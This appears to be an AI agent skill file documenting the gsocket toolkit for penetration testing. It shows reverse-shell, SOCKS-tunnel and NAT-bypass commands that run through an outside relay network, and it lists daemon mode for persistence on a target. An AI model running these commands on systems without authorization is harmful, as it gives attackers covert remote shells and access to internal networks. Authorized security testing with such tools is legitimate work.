---
name: gsocket
description: Establish secure, end-to-end encrypted communication between two machines on different networks without IP addresses or port forwarding. It uses the Global Socket Relay Network (GSRN) to connect peers via a shared secret. Use for bypassing NAT/firewalls, establishing reverse shells, secure file transfers, mounting remote filesystems, or creating SOCKS proxies during penetration testing and post-exploitation.
---

# gsocket

## Overview
The Global Socket Toolkit allows programs to communicate regardless of network location or firewall restrictions by using a shared secret instead of IP addresses. It negotiates a secure TLS connection (End-2-End) where the secret never leaves the workstation. Category: Exploitation / Post-Exploitation / Sniffing & Spoofing.

## Installation (if not already installed)
Assume the tool is installed. If not:
```bash
sudo apt install gsocket
```

## Common Workflows

### Interactive Reverse Shell (PTY)
On the target (Server):
```bash
gs-netcat -s MySecret -l -i
```
On the attacker (Client):
```bash
gs-netcat -s MySecret -i
```

### Secure File Transfer (blitz)
On the receiving end:
```bash
blitz -s MySecret -l
```
On the sending end:
```bash
blitz -s MySecret file1.txt file2.txt
```

### SOCKS Proxy through Firewall
On the target (Server):
```bash
gs-netcat -s MySecret -l -S
```
On the attacker (Client):
```bash
gs-netcat -s MySecret -p 1080
```
The attacker now has a SOCKS proxy listening on localhost:1080 that tunnels into the target network.

### Accessing SSH behind NAT
On the target:
```bash
gsocket -s MySecret /usr/bin/sshd -d
```
On the client:
```bash
gsocket -s MySecret ssh root@gsocket
```

## Complete Command Reference

### gs-netcat
The core utility for data transfer and remote execution.

| Flag | Description |
|------|-------------|
| `-s <secret>` | Shared secret (password) |
| `-k <file>` | Read secret from file |
| `-r` | Receive-only mode. Terminate when no more data |
| `-I` | Ignore EOF on stdin |
| `-l` | Listening server mode [default: client] |
| `-g` | Generate a random secret |
| `-v` | Verbose output (`-vv` or `-vvv` for more) |
| `-q` | Quiet mode. No log output |
| `-w` | Wait for server to become available [client only] |
| `-C` | Disable encryption |
| `-T` | Use TOR or a Socks proxy |
| `-L <file>` | Log output to file |
| `-t` | Check if peer is listening without connecting |
| `-S` | Act as a SOCKS server [requires -l] |
| `-D` | Daemon & Watchdog mode (runs in background) |
| `-d <IP>` | IPv4 address for port forwarding |
| `-p <port>` | Port to listen on or forward to |
| `-u` | Use UDP [requires -p] |
| `-i` | Interactive login shell (TTY) [Ctrl-e q to terminate] |
| `-e <cmd>` | Execute command (e.g., "bash -il") |
| `-m` | Display man page |

### gsocket
Wraps existing programs to make them accessible via GSRN.

| Flag | Description |
|------|-------------|
| `-s <secret>` | Shared secret |
| `-k <file>` | Read secret from file |
| `-p <ports>` | Range of listening ports to redirect [default: all] |
| `-T` | Use TOR |

### blitz
High-speed secure file transfer using rsync logic.

| Flag | Description |
|------|-------------|
| `-l` | Server Mode |
| `-s <secret>` | Shared secret |
| `-k <file>` | Read secret from file |
| `-f <list>` | Read list of file names from FILE (or - for stdin) |
| `-o RSOPT=val`| Options passed to rsync (e.g., `-o 'RSOPT=--bwlimit=10'`) |

### gs-mount
Mount remote filesystems over Global Socket.

| Flag | Description |
|------|-------------|
| `-l` | Server Mode |
| `-R` | Server in read-only mode |
| `-s <secret>` | Shared secret |
| `-k <file>` | Read secret from file |

### gs-sftp
SFTP server and client functionality.

| Flag | Description |
|------|-------------|
| `-l` | Server Mode |
| `-R` | Server in read-only mode |
| `-s <secret>` | Shared secret |
| `-k <file>` | Read secret from file |

## Notes
- **Security**: The GSRN relay only sees encrypted traffic; the TLS connection is end-to-end.
- **Termination**: When using interactive mode (`-i`), use `Ctrl-e q` to terminate the session.
- **Persistence**: Use the `-D` flag with `gs-netcat` for background persistence (Daemon mode).